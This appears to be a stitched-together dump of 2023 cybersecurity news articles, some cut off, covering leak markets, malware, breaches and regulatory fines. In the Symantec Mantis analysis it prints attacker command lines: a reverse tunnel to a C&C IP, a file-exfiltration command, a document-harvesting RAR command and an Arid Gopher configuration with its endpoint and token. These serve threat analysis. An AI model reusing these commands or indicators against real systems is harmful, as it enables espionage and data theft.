choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."

      "text": " A threat group called ARES is gaining notoriety on the cybercrime scene by selling and leaking databases stolen from corporations and public authorities.The actor emerged on Telegram in late 2021 and has been associated with the RansomHouse ransomware operation and the data leak platform, KelvinSecurity, and the network access group Adrastea.ARES Leaks is a platform hosted on the regular web that offers access to data leaks from 65 countries, including the United States, France, Spain, Australia, and Italy.The website hosts leaks with all types of information, from phone numbers, email addresses, customer details, B2B, SSN, and company databases, to forex data, government leaks, and passports.The group accepts cryptocurrency payments from members who want to access the offered data or to purchase one of the available services, which span vulnerability exploitation, pen-testing, malware development, and distributed denial of service (DDoS) attacks.According to Cyfirma, the activity on ARES Leaks increased on the heels of Breached shutting down.At the end of 2022, ARES sought to hire malware developers and expert pen-testers who could work in Syria, offering payment in cryptocurrency.ARES also operates private and VIP channels, presumably selling more valuable data leaks from high-profile organizations.Cyfirma reports that ARES has recently initiated efforts to acquire military access and databases, actively promoting its interest through advertisements on cybercrime platforms.LeakBase launched in early 2023 and it is another project supported by the ARES threat group. Aggressive promotion and Breached hacker forum closing its doors caused many users to sign up.It is hosted on the clear web and free for anyone to join, offering free databases, a market space for selling leaks, leads, exploits, and services, and an escrow payments system to inspire trust.The forum also hosts spaces for programming, hacking tips, tutorials, social engineering, penetration, cryptography, anonymity, and opsec guides and discussions.LeakBase is a far cry from Breached at this time, but its reputation appears to be growing and it could soon become a significant hub for information and services for cybercriminals.ARES seems to be a well-organized threat group that kept expanding operations and services to cover all major cybercrime interests.Cyfirma believes that ARES sees the shutdown of Breached as an opportunity to accelerate its growth and to establish its position in the cybercrime market."

      "text": " Just three weeks earlier, Samsung had lifted a ban on employees using OpenAI’s ChatGPT over data privacy concerns.The ban was originally intended to protect company data but was lifted on March 11, 2023, so that engineers at the semiconductor division could use ChatGPT to fix problems with the source code, improve productivity as well as be aware of the latest technological changes.While permitting the use of ChatGPT, the South Korean giant also issued a notice to the semiconductor division to “be careful about internal information security and do not enter private information” in the popular artificial intelligence (AI) chatbot.In the first instance, an employee from Semiconductor and Device Solutions faced an issue while executing a semiconductor equipment measurement database (DB) download software.Since it appeared like a software source code issue, the employee copied and pasted the buggy confidential company source code into the AI tool. It then asked the chatbot to check for the errors and find a solution, actually making the source code part of ChatGPT’s internal training data.In the second instance, an employee when faced with difficulty in understanding the device yield and other information shared the code with the AI chatbot and requested “code optimization” from ChatGPT.While in the third instance, an employee shared a recording of a confidential company meeting and asked the ChatGPT to convert it into notes for a presentation. The information shared with ChatGPT due to these incidents is now part of it forever and cannot be deleted.As a result, Samsung took immediate measures and has now limited the length of each employee’s ChatGPT prompts to a kilobyte or 1024 characters of text. The company is also said to be investigating the three employees who were part of the leak, as well as considering re-instating the ban.In order to prevent such embarrassing mishaps in the future, Samsung is now developing its own AI chatbot, which is meant to be strictly used by its employees for internal purposes.“If a similar accident occurs even after emergency information protection measures are taken, access to ChatGPT may be blocked on the company network,” reads an internal memo sent by Samsung advising its employees to exercise caution while using the AI tool.“As soon as content is entered into ChatGPT, data is transmitted and stored to an external server, making it impossible for the company to retrieve it.”It is important to note that all questions and text shared with ChatGPT are retained in order to train and improve its AI models unless users explicitly choose to opt out. In other words, it is difficult or impossible to erase the data completely from the system.“As part of our commitment to safe and responsible AI, we review conversations to improve our systems and to ensure the content complies with our policies and safety requirements…Your conversations may be reviewed by our AI trainers to improve our systems,” OpenAI clearly explains on its website.Notably, OpenAI claims, “We remove any personally identifiable information from data we intend to use to improve model performance. We also only use a small sampling of data per customer for our efforts to improve model performance.”"

      "text": "   Jerrod Piker, competitive intelligence analyst at Deep Instinct, explained that this attack involves a malicious JavaScript that was served by almost every page of the eFile.com website. As early as the middle of March, Piker said users began noticing a fake SSL error message that prompted them to update their browser to support loading the page.Further analysis indicated that the SSL error page was indeed malicious, and the link to “update the browser” actually pointed to a command-and-control address in which a malicious payload was downloaded to the user’s system.“While it’s unclear how many people were actually infected by this malicious script, it’s very concerning that the hacked web pages were serving the malicious script for weeks before any action was taken,” said Piker. “Also, since this attack was timed around tax season, the potential impact was exponentially greater.\"Piker said the problem with eFile is an example of not trusting even legitimate sites, adding that the fake SSL error message was a dead giveaway for this particular attack.\"Zane Bond, head of product at Keeper Security, said tax-filing services and their customers are prime targets for cybercriminals in the peak of their busiest season of the year. Bond added that the fact that the specific eFile issue was brought up weeks ago and not resolved was cause for concern.“However, instead of analyzing the specifics of the compromise, customers want to know what they can do to protect themselves, which comes down to the basics,” said Bond. “Don’t make risky clicks. Any website asking a customer to download and run an executable should be a red flag. Even the false flag of an SSL error should have been concerning.”John Bambenek, principal threat hunter at Netenrich, said anything used in filing tax returns is highly sensitive. Bambenek said attackers know that tax fraud has become a lucrative business with billions lost annually, and that changes were made to a production website that were not detected, means some basic detections were not present.“Anything that’s both public-facing and involved in sensitive transactions should have strong controls in place to detect unauthorized changes,” said Bambenek.Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.Attacks deployed by Iranian state-backed threat operation MuddyWater against Israel saw the utilization of the new MuddyC2Go command-and-control framework, which replaced the PhonyC2 custom platform following the exposure of its source code, reports The Hacker News.Israel had its technology, logistics, and transportation industries targeted by Iranian advanced persistent threat operation Charming Kitten, also known as APT35 and Imperial Kitten, last month amid its ongoing war with Palestinian militant group Hamas, according to The Record, a news site by cybersecurity firm Recorded Future.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": "  A coordinated effort has brought down the largest criminal marketplace for stolen credentials, Genesis Market, the Department of Justice confirmed.Attorney General Merrick Garland warned that its seizure “should serve as a warning to cybercriminals who operate or use these criminal marketplaces: DoJ and our international partners will shut down your illegal activities, find you, and bring you to justice.” Launched in March 2018, Genesis Market advertised and sold packages of account access credentials, including usernames and passwords for bank accounts, social media and email accounts, which the threat actors stole from global victims after infecting devices with malware.The marketplace enabled cybercriminals to victimize individuals, businesses, and governments around the world,” said Garland, in a statement. Its influence stemmed from its sales offerings: the type of access sought by ransomware hacking groups. It offered sector reports, confirming the site was used by these actors to attack its victims.Genesis Market boasted stolen credentials tied to the financial and critical infrastructure industries, as well as federal, state and local government agencies. User-friendly, cybercriminal users could leverage the market to search for stolen credentials based on location or account type.It was also seen as one of the “most prolific initial access brokers in the cybercrime world.” At the time of the seizure, the market was offering access to data stolen from more than 1.5 million compromised devices and over 80 million account access credentials. The market also posted device “fingerprints,” or unique combinations of device identifiers and browser cookies able to bypass anti-fraud tools used by websites. Overall, each stolen offering allowed cybercriminals to assume the identity of victims to trick sites into thinking the malicious actor was indeed the account owner.The federal law enforcement effort worked to identify prolific users of the Genesis Market, keenly focused on finding who purchased and used the stolen access credentials for fraud and other cybercrimes. Hundreds of leads have been sent to the FBI and foreign law enforcement, which have already led to “many arrests.”“Operation Cookie Monster” has also led to the seizure of 11 domain names used to support Genesis Market’s infrastructure, levied by a warrant authorized by the U.S. District Court for the Eastern District of Wisconsin.“Genesis falsely promised a new age of anonymity and impunity, but in the end only provided a new way for the department to identify, locate and arrest on-line criminals,” said Deputy Attorney General Lisa Monaco. These law enforcement agencies are committed “to disrupting and dismantling key services used by criminals to facilitate cybercrime,” warned FBI Director Christopher Wray.

      "text": " Security researchers discovered a new malicious browser extension called Rilide, that targets Chromium-based products like Google Chrome, Brave, Opera, and Microsoft Edge.The malware is designed to monitor browser activity, take screenshots, and steal cryptocurrency through scripts injected in web pages.Researchers at Trustwave SpiderLabs found that Rilide mimicked benign Google Drive extensions to hide in plain sight while abusing built-in Chrome functionalities.While the origin of the malware is unknown, Trustwave reports that it has overlaps with similar extensions sold to cybercriminals. At the same time, portions of its code were recently leaked on an underground forum due to a dispute between cybercriminals over unresolved payment.Rilide’s loader modifies the web browser shortcut files to automate the execution of the malicious extension that is dropped on the compromised system.Upon execution, the malware runs a script to attach a listener that monitor when the victim switches tabs, receives web content, or webpages finish loading. It also checks if the current site matches a list of targets available from the command and control (C2) server.If there’s a match, the extension loads additional scripts injected into the webpage to steal from the victim information related to cryptocurrencies, email account credentials, etc.The extension also disables ‘Content Security Policy,’ a security feature designed to protect against cross-site scripting (XSS) attacks, to freely load external resources that the browser would normally block.In addition to the above, the extension regularly exfiltrates browsing history and can also capture screenshots and send them to the C2.An interesting feature in Rilide is its 2FA-bypassing system, which uses forged dialogs to deceive victims into entering their temporary codes.The system is activated when the victim initiates a cryptocurrency withdrawal request to an exchange service that Rilide targets. The malware jumps in at the right moment to inject the script in the background and process the request automatically.Once the user enters their code on the fake dialog, Rilide uses it to complete the withdrawal process to the threat actor’s wallet address.“The withdrawal request email is replaced with a device authorization request tricking the user into providing the authorization code.”Rilide showcases the growing sophistication of malicious browser extensions that now come with live monitoring and automated money-stealing systems."

Still, Svistunova said these campaigns were effective, nevertheless.“What are these fake pages that are so easy to generate?

      "text": " A pair of zero-day vulnerabilities in several Quality Network Appliance Provider (QNAP) operating systems (OS) for network-attached storage (NAS) appliances are impacting an estimated 80,000 devices worldwide. They remain unpatched for two of the four affected OSes.QNAP provides gear and software for Internet of Things (IoT) storage, networking, and smart video. The OS bugs, discovered by researchers at Sternum, are memory access violations, which could cause unstable code and could provide a path for an authenticated cybercriminal to execute arbitrary code.Sternum researchers explain the memory access violations affect the performance, as well as the security of the QNAP devices.\"From a performance point of view, they could lead to stability issues and unpredictable code behavior,\" Sternum's director of security of research Amit Serper says. \"From a security perspective, they can be used for arbitrary code execution by a malicious threat actor.\"DeadBolt is clearly dead set, as it were, on putting effort into finding — and exploiting — QNAP flaws, preferably critical zero-days, according to Mark Parkin, senior technical engineer with Vulcan Cyber.\"It's sometimes said that finding one vulnerability in a target will lead people into looking for more,\" Parkin explains. \"The issue here is that they are finding more as they look. It almost makes you wonder if the attackers don't have access to the source code, or some other way to get an inside track.\"In the case of the most recent vulnerabilities, users with systems without a patch available should employ a strong endpoint detection and response (EDR) solution and look for indicators of compromise. Because cyberattackers would need to be authenticated, doing an audit of who has access to vulnerable systems and providing additional authentication protection could also help mitigate an attack.One researcher warns that even in cases where patches are available, truly locking down the appliances might require a shift in mindset for some companies. \"QNAP devices are very attractive to cybercriminals whose strategy is to ask a large number of victims for a small amount of money,\" Bud Broomhead, CEO of Viakoo says. \"Because QNAP devices, along with many other IoT devices, are largely managed outside of IT, they are often misconfigured, left unprotected by a firewalls, and left unpatched.\"He adds, \"These devices often are invisible to corporate IT and security teams and do not get audited or observed when they fall out of compliance, such as by being on out-of-date and insecure firmware.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

The rule mandates such apps to provide users with an option to delete both the accounts and the data associated with them.“For apps that enable app account creation, developers will soon need to provide an option to initiate account and data deletion from within the app and online,” Otuteye wrote.The executive clarified that while Google Play’s data safety section already allows developers to showcase data deletion options, the company aims to provide users with a more accessible and consistent way to request them.“By creating a more intuitive experience with this policy, we hope to better educate our shared users on the data controls available to them,” explained Otuteye.The new policy means that when developers fulfil a request to delete an account, they must also delete the associated data.The feature will also enable users not wishing to delete their entire account to only remove some data types like images, videos or history.Otuteye clarified that developers needing to retain specific data for legitimate reasons (e.g., security, fraud prevention or regulatory compliance) would have to disclose those data retention practices.“We’re asking developers to submit answers to new Data deletion questions in your app’s Data Safety form by December 7,” reads the post.Developers requiring more time can request an extension in Play Console until May 31 2024.“Early next year, Google Play users will begin to see reflected changes in your app’s store listing, including the refreshed data deletion badge in the Data safety section and the new Data deletion area,” Otuteye concluded.Editorial image credit: quietbits / Shutterstock.com"

      "title": "Mantis: New Tooling Used in Attacks Against Palestinian Targets | Symantec Enterprise Blogs",
      "text": " The Mantis cyber-espionage group (aka Arid Viper, Desert Falcon, APT-C-23), a threat actor believed to be operating out of the Palestinian territories, is continuing to mount attacks, deploying a refreshed toolset and going to great lengths to maintain a persistent presence on targeted networks.Mantis has been active since at least 2014, with some third-party reporting suggesting it may have been active as early as 2011. The group is known to target organizations in Israel and a number of other Middle Eastern countries. Sectors targeted include government, military, financial, media, education, energy, and think tanks. The group is known for employing spear-phishing emails and fake social media profiles to lure targets into installing malware on their devices.In its most recent attacks, the group used updated versions of its custom Micropsia and Arid Gopher backdoors to compromise targets before engaging in extensive credential theft and exfiltration of stolen data.The initial infection vector for this campaign remains unknown. In one organization targeted, a feature of the compromise was that the attackers deployed three distinct versions of the same toolset (i.e. different variants of the same tools) on three groups of computers. Compartmentalizing the attack in this fashion was likely a precautionary measure. If one toolset was discovered, the attackers would still have a persistent presence on the target’s network.The following is a description of how one of those three toolsets was used:The first evidence of malicious activity occurred on December 18, 2022. Three distinct sets of obfuscated PowerShell commands were executed to load a Base64-encoded string, which started embedded shellcode. The shellcode was a 32-bit stager that downloaded another stage using basic TCP-based protocol from a command-and-control (C&C) server: 104.194.222[.]50 port 4444.Micropsia subsequently executed and initiated contact with a C&C server. On the same day, Micropsia also executed on three other machines in the same organization. In each case, it ran in a folder named after its file name:On one computer, Micropsia was used to set up a reverse socks tunnel to an external IP address:CSIDL_COMMON_APPDATA\\windowsservicemanageav\\windowsservicemanageav.exe -connect 104.194.222[.]50:443 [REDACTED]On December 20, Micropsia was used to run an unknown executable named windowspackages.exe on one of the infected computers.The following day, December 21, RAR was executed to archive files on another infected computer.Between December 22 and January 2, 2023, Micropsia was used to execute the Arid Gopher backdoor on three infected computers. Arid Gopher was in turn used to run a tool called SetRegRunKey.exe that provided persistence by adding Arid Gopher to the registry so that it executed on reboot. It also ran an unknown file named localsecuritypolicy.exe (this file name was used for the Arid Gopher backdoor elsewhere by the attackers).On December 28, Micropsia was used to run windowspackages.exe on three more infected computers.On December 31, Arid Gopher executed two unknown files named networkswitcherdatamodell.exe and networkuefidiagsbootserver.exe on two of the infected computers.On January 2, the attackers retired the version of Arid Gopher they were using and introduced a new variant. Whether this was because the first version was discovered or whether it was standard operating procedure is unclear.On January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\\hostupbroker\\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file:CSIDL_COMMON_APPDATA\\windowsupserv\\windowsupserv.exe -f CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-13-39_getf.rarOn January 9, Arid Gopher was used to execute two unknown files on a single computer:The last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours.Variants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths:Micropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included:In addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration:\"%PROGRAMDATA%\\Software Distributions\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 \"%PROGRAMDATA%\\Software Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41\" \"%USERPROFILE%\\*.xls\" \"%USERPROFILE%\\*.xlsx\" \"%USERPROFILE%\\*.doc\" \"%USERPROFILE%\\*.docx\" \"%USERPROFILE%\\*.csv\" \"%USERPROFILE%\\*.pdf\" \"%USERPROFILE%\\*.ppt\" \"%USERPROFILE%\\*.pptx\" \"%USERPROFILE%\\*.odt\" \"%USERPROFILE%\\*.mdb\" \"%USERPROFILE%\\*.accdb\" \"%USERPROFILE%\\*.accde\" \"%USERPROFILE%\\*.txt\" \"%USERPROFILE%\\*.rtf\" \"%USERPROFILE%\\*.vcf\"Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components:Arid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor.When communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands:Arid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually.The embedded setup.env file used by one analyzed variant of Arid Gopher to retrieve configuration data contained the following:DIR=WindowsPerceptionServiceENDPOINT=http://jumpstartmail[.]com/IURTIER3BNV4ERLOGS=logs.txtDID=code.txtVER=6.1EN=2ST_METHOD=rST_MACHINE=falseST_FLAGS=xCOMPRESSOR=7za.exeDDIR=ResourcesFilesBW_TOO_ID=7463b9da-7606-11ed-a1eb-0242ac120002SERVER_TOKEN=PDqMKZ91l2XDmDELOrKBSTAPP=AttestationWmiProvider.exeSHORT_APP=ServiceHubIdentityHost.exeThe setup.env configuration file mentions another file, AttestationWmiProvider.exe, which is also embedded in Arid Gopher. The file is a 32-bit executable that is used as a helper to ensure that another executable will run on reboot. When it executes, it checks for the following command-line arguments:\"key\" with string parameter [RUN_VALUE_NAME]\"value\" with string parameter [RUN_PATHNAME]It then arranges to receive notification on a signal using func os/signal.Notify(). Once notified, it sets the following registry value:HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\"Our investigation so far shows this file setting Arid Gopher to run on reboot:CSIDL_COMMON_APPDATA\\attestationwmiprovider\\attestationwmiprovider.exe -key=NetworkVirtualizationStartService \"-value=CSIDL_COMMON_APPDATA\\networkvirtualizationstartservice\\networkvirtualizationstartservice.exe -x\"The attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named WindowsUpServ.exe. When run, the tool checks for the following command-line arguments: \"-d\" \"[FILE_DIRECTORY]\"\"-f\" \"[FILENAME]\"For each \"-f\" \"[FILENAME]\" command-line argument, the tool uploads the content of [FILENAME]. For each \"-d\" \"[FILE_DIRECTORY]\" command-line argument, the tool obtains a list of files stored in the folder [FILE_DIRECTORY] and uploads the content of each file.When uploading each file, the tools sends an HTTP POST request to a C&C server with the following parameters:\"kjdfnqweb\": [THE_FILE_CONTENT]\"qyiwekq\": [HOSTNAME_OF_THE_AFFECTED_COMPUTER]Whenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may also log some of its actions in the following files:\"C:\\ProgramData\\WindowsUpServ\\success.txt\"\"C:\\ProgramData\\WindowsUpServ\\err.txt\"Mantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the chances of the entire operation being detected.If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.The Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.We encourage you to share your thoughts on your favorite social platform."

      "text": " A new dark web marketplace called STYX launched earlier this year and appears to be on its way to becoming a thriving hub for buying and selling illegal services or stolen data.Among the services provided are money laundering, identity theft, distributed denial-of-service (DDoS), bypassing two-factor authentication (2FA), fake or stolen IDs and other personal data, renting malware, using cash-out services, email and telephone flooding, identity lookup, and much more.The marketplace opened its doors officially on January 19 and it uses a built-in escrow system to broker transactions between buyers and sellers.However analysts at threat intelligence company Resecurity noticed mentions of STYX on the dark web since early 2022, when the founders were still building the escrow module.STYX supports payments with multiple cryptocurrencies and features a special section reserved for trusted sellers that lists vetted vendors, likely in an attempt to increase trust in the platform.To showcase the purchasing process the market points to Telegram channels where bots interact with buyers and provide samples of the products sold. Below are samples from one seller that offers fake IDs, who created documents in in the name of U.S. President Joe Biden and former professional footballer David Beckham.Researchers at Resecurity have compiled a report presenting some notable cases they discovered while exploring STYX, aiming to highlight the risks that arise from the operation of these illicit platforms and uncover the actual dimension of cybercrime.Resecurity navigated all sections of STYX and found that it offers the following:The money laundering section is one of the most significant in STYX, as “cleaning” the the stolen funds is a crucial part of the cybercriminal activity.Resecurity highlighted some vendors that offer money laundering services through STYX, like “Verta,” who requests a minimum of $15,000 for individuals and $75,000 for businesses and keeps 50% of the laundered amount.Other providers of money laundering services have different fees, as seen in the screenshot below.“The commission spread depends on the popularity of the service/bank, the complexity of the cash-out process, including the tactics the launderers will have to deploy to successfully circumvent a payment platform’s anti-fraud filters,” the researchers explain.STYX hosts a plethora of cash-out shops that cover the entire world, offering the \"clean\" funds via Apply Pay, PayPal business accounts with merchant terminals, and various financial institutions in the U.S., U.K., and Canada.The emergence of STYX as a new platform for financially-motivated cybercriminals shows that the market for illegal services continues to be a lucrative business.Digital banks, online payment platforms, and e-commerce systems need to rise to the challenge and upgrade their KYC checks and fraud protections to undermine the effectiveness of the services sold in these crime spaces."

      "text": " What might be the fastest-ever ransomware encryption binary has been spotted in the wild, locking up systems at nearly twice the speed of the notorious LockBit 3.0 malware.Aside from its concerning efficiency, Rorschach is notable because it contains publicly known elements cribbed from leaked source code from other ransomware strains. And interestingly, the operators behind Rorschach don't employ an alias, nor do they brand their wares — very uncommon to see in ransomware gangland where reputation matters and self-promotion is rife.The result is a malware strain that is open to interpretation in terms of who its operators are and where it fits in the ecosystem — hence the name.“Just as a psychological Rorschach test looks different to each person, this new type of ransomware has high levels technically distinct features taken from different ransomware families — making it special and different from other ransomware families,\" says Sergey Shykevich, threat intelligence group manager at CPR.The Frankenstein aspects present in the malware include:It also makes use of direct syscalls to silently inject malicious code into other processes, which CPR researchers called \"startling,\" since the technique is extremely rare in the ransomware ecosystem.\"This technique is commonly used to evade behavioral detection by advanced and sophisticated malware, and is not commonly observed in ransomware,\" explains Shykevich. \"Implementation of such mechanisms makes it much more difficult to detect the ransomware.\"Also notable: It's partially autonomous, meaning that it can worm its way through an environment without user interaction.\"It spreads itself automatically when executed on a Domain Controller (DC), while it clears the event logs of the affected machines,\" according to the analysis. \"In addition, it’s extremely flexible, operating not only based on a built-in configuration but also on numerous optional arguments which allow it to change its behavior according to the operator’s needs.\"In all, Rorschach \"raises the bar for ransom attacks,\" according to CPR researchers.\"This is the fastest and one of the most sophisticated ransomware we’ve seen so far,\" Shykevich says. \"It speaks to the rapidly changing nature of cyberattacks and to the need for companies to deploy a prevention-first solution that can stop Rorschach from encrypting their data.”Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": "  A malicious campaign was caught heavily loading spam packages in NPM, which resulted in a denial-of-services (DoS) and caused the registry service to be sporadically unavailable.  \"It was especially concerning that this attack affected the stability of NPM, particularly, because NPM is a critical component for modern software developers,\" Tzachi Zornstain, head of CxDustico at Checkmarx, told SC Media.   \"We suspect that the attacker does not intend to damage the stability of NPM. However, it was a side effect of this massive attack.\"  It is not uncommon for spam campaigns to target open-source repositories, but Jossef Harush Kadouri, head of software supply chain security at Checkmarx, said the onslaught of attacks over the past month is \"by far the worst one\" he has seen.  \"Since the open-source ecosystems are highly reputed on search engines, any new open-source packages and their descriptions inherit this good reputation have become well-indexed on search engines, making them more visible to unsuspecting users,\" Kadouri wrote the blog post.  \"Apparently, attackers found the unvetted open-source ecosystems as an easy target to perform SEO poisoning for various malicious campaigns. As long as the name is untaken, they can publish an unlimited number of packages.\"  Even more concerning, researchers found that the malware the threat actors delivered is highly obfuscated, evasive, and anti-debug. The packages' description was linked to the download of a malicious password-encrypted zip file containing a 600mb zero-padded .exe file. This tactic makes it difficult for EDR systems to detect malicious activities, Kadouri noted.  Upon further investigation, researchers observed a wide range of other techniques employed by the threat actors, including DLL side-loading and virtualization/sandbox evasion to steal credentials and mine cryptocurrency. The researchers also observed attackers disabling tools and firewalls, as well as dropping tools such as Glupteba, RedLine, Smoke Loader and xmrig.   In response to the incident, the NPM team implemented an anti-bot mechanism to raise the bar against automated account creation used in similar attacks.  Menghan Xiao is a cybersecurity reporter at SC Media, covering software supply chain security, workforce/business, and threat intelligence.

      "text": " The developers of the Typhon info-stealer announced on a dark web forum that they have updated the malware to a major version they advertise as ‘Typhon Reborn V2’They boast significant improvements designed to thwart analysis via anti-virtualization mechanisms.While the initial version was sold via Telegram for a single lifetime payment of $50, the malware developers also offered to distribute Typhon for roughly $100 per 1,000 victims.According to Cisco Talos, the codebase for Typhon V2 has been heavily modified to make the malicious code more robust, reliable, and stable.The string obfuscation has been improved using Base64 encoding and XOR, which makes analysis of the malware a more challenging task.The researchers noticed a more more comprehensive mechanism for avoiding the infection of analysis machines, with the malware now looking at a wider range of criteria, including usernames, CPUIDs, applications, processes, debugger/emulation checks, and geolocation data before running the malicious routines.The malware can exclude Commonwealth of Independent States (CIS) countries or it can follow a user-supplied custom geolocation list.The most notable new feature is Typhon’s process to check if it runs on a victim’s environment, and not a simulated host on a researcher’s computer.This includes checking for GPU information, the presence of DLLs associated with security software, the video controller for VM indicators, performing registry checks, usernames, and even checking for the presence of Wine, an emulator of Windows.Data collection capabilities have been expanded in the latest version of Typhon as it now targets a larger number of apps, including gaming clients. However, it looks like the feature is still un the works because it was inactive in the samples analyzed by Cisco Talos.Typhon still targets multiple email clients, messaging apps, cryptocurrency wallet apps and browser extensions, FTP clients, VPN clients, and information stored in web browsers. It can also capture screenshots from the compromised device.Another new feature is a new file grabber component that allows the operators to search for and exfiltrate specific files from the victim’s environment.The data is stolen via HTTPS using the Telegram API, which was the method of choice in the original version of the malware too.The emergence of Typhon Reborn V2 represents a significant evolution for the MaaS and confirms the developers’ commitment to the project.Cisco Talos' analysis can help malware researchers come up with proper detection mechanisms for the new Typhon version, since its relatively low cost and capabilities are likely to increase its popularity."

      "text": "  TikTok will pay a fine of £12.7M, or roughly $16 million, to the UK Information Commissioner’s Office (ICO) over multiple data protection violations, including the unlawful use of children’s personal data and using the data tied to children under the age of 13 without parental consent.Under UK data protection laws, organizations that offer information society services to children under 13 and use personal data must first gain parental and guardian consent. But ICO found that TikTok allowed an estimated 1.4 million children under 13 to use the app in 2020, in contradiction to its own policies that would prevent young children from creating an account.ICO determined TikTok failed to gain parental consent “even though it ought to have been aware” that underage children were using the platform. The violation stemmed from TikTok’s failure to “carry out adequate checks to identify and remove underage children from its platform.”What’s more, the investigation into TikTok revealed senior employees were aware of the violation and raised concerns. It’s ICO’s belief that TikTok did not adequately respond. UK Information Commissioner John Edwards asserted the fine “reflects the serious impact their failures may have had” on underage children, after the app’s leaders failed to check who was using the platform or “take sufficient action to remove the underage children” from the app.“There are laws in place to make sure our children are as safe in the digital world as they are in the physical world. TikTok did not abide by those laws,” Edwards said in a statement. “As a consequence, an estimated one million under 13s were inappropriately granted access to the platform, with TikTok collecting and using their data.”“That means that their data may have been used to track them and profile them, potentially delivering harmful, inappropriate content at their very next scroll,” he added. “TikTok should have known better. TikTok should have done better.”The ICO found that TikTok breached the UK General Data Protection Regulation (UK GDPR) between May 2018 and July 2020 by:Specifically, ICO found TikTok failed to provide proper and clearly understandable information to users about how their data is collected, used, and shared. As a result, users, especially children, “were unlikely to be able to make informed choices” about whether they should engage with the app.TikTok is also accused of failing to ensure personal data was lawfully, transparently, and fairly processed.Following the investigation, ICO published a children’s code to better protect the digital identities of children. The “statutory code of practice” is meant for apps, gaming platforms, and social media sites designed to be accessed by children.Chew defended claims the app was “spying” on Americans and enabled China to use TikTok to monitor user locations, referencing the ongoing Project Texas effort that will relocate all U.S. data to a domestic location and give a U.S. tech firm the authority to examine the app’s code.But the testimony did not go far enough for some lawmakers. Rep. Diana DeGette, D-Colo., said Chew’s testimony gave “only generalized statements that you're investing, that you're concerned, that you're doing work.

      "text": " A law firm representing Uber Technologies has notified an unknown number of its drivers that sensitive data, including their names and Social Security numbers, has been stolen by cyberattackers.It's the third data breach in six months for the ride-share giant.Law firm Genova Burns LLC, based in Newark, NJ, first noticed suspicious activity at the end of January, and — after an investigation by outside specialists — discovered that its systems had been compromised and data on an undisclosed number of Uber drivers had been stolen, according to a letter published online on April 4. Uber sent the information to the law firm in connection with its legal representation, the letter stated.Genova Burns did not explain why the law firm needed drivers' personally identifiable information (PII) and did not respond to multiple requests for comment.\"Upon learning of the event, we investigated to determine the nature and scope of the incident and secured the environment by changing all system passwords,\" the law firm said in the letter sent to Uber drivers. \"We also notified law enforcement and are cooperating with its investigation. We will be taking additional steps to improve security and better help protect against similar incidents in the future.\"By using malicious search engine optimization techniques, the attackers in that case lured potential victims to malicious sites, which then attempt to compromise the user's machine with their malware, says Keith Jarvis, a senior security researcher at Secureworks' Counter Threat Unit (CTU), who adds that it's unclear if the Uber data was specifically targeted or just caught up in such an effort.\"We do not know if this targeting is intentional or incidental, but it has been effective at ensnaring organizations in legal services,\" he says.In the latest attack, Uber confirmed the breach, but directed questions back to its law firm.\"These drivers have been notified that their Social Security number and/or tax identification number have been potentially impacted and [were] offered complimentary credit monitoring and identity protection services,\" Uber said in a statement. \"Genova Burns indicates that they are not aware of any actual or attempted misuse of the information, and confirmed that they are taking additional steps to improve security and better protect against similar incidents in the future.\"The law firm first detected the attack on Jan. 31, and, following an investigation by an unnamed third-party forensics and data-security specialist, discovered that its data had been accessed and exfiltrated during the week prior to discovery.While most cybercriminals are opportunistic attackers, law firms often attract unwanted scrutiny, says Secureworks' Jarvis.\"For the minority of cybercriminal attacks where a victim is targeted, organizations with access to large amounts of third-party data, such as law firms, present a valuable target,\" he says. \"Law firms also frequently fit the profile of small to midsized organizations with a sizable IT footprint but no dedicated security resources.\"Copyright © 2023 Informa PLC Informa 